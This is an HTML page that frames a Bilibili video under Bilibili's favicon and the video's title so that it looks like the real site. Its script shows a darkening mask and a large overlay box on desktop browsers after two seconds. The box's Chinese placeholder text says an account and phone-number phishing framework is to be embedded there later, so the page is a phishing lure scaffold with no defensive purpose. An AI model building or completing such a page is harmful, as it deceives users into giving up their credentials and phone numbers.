<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <link rel="icon" href="https://i0.hdslb.com/bfs/static/jinkela/long/images/favicon.ico" type="image/x-icon">
  <title>在中国居住生活10年的英国小哥，热爱生活！油管：Living in China</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
    #container {
      position: relative;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 0;
    }

    /* 灰色遮罩层 */
    #overlay-mask {
      position: absolute;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5); /* 半透明黑 */
      z-index: 900;
      display: none;
    }

    /* 白色按钮层 */
    #full-overlay-button {
      margin-left: -14px;
      width: 820px;
      height: 430px;
      background-color: rgb(255, 255, 255);
      border-radius: 8px;
      z-index: 1000;
      cursor: pointer;
      display: none; /* 初始隐藏 */
      font-size: 45px;
    }

  </style>
</head>
<body>

<div id="container">
  <iframe src="https://www.bilibili.com/video/BV1u4grzGEcB"  allowfullscreen></iframe>
  
  <!-- 遮罩层 -->
  <div id="overlay-mask"></div>

  <!-- 白色按钮 -->
  <div id="full-overlay-button">稍后在这里嵌入账号和手机号钓鱼框架</div>
</div>

<script>
  function isPC() {
    const ua = navigator.userAgent;
    return !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  }

  if (isPC()) {
    setTimeout(function () {
      const button = document.getElementById('full-overlay-button');
      const mask = document.getElementById('overlay-mask');

      button.style.display = 'block';
      mask.style.display = 'block';

      // 不执行任何跳转操作
    }, 2000);
  }
</script>

</body>
</html>
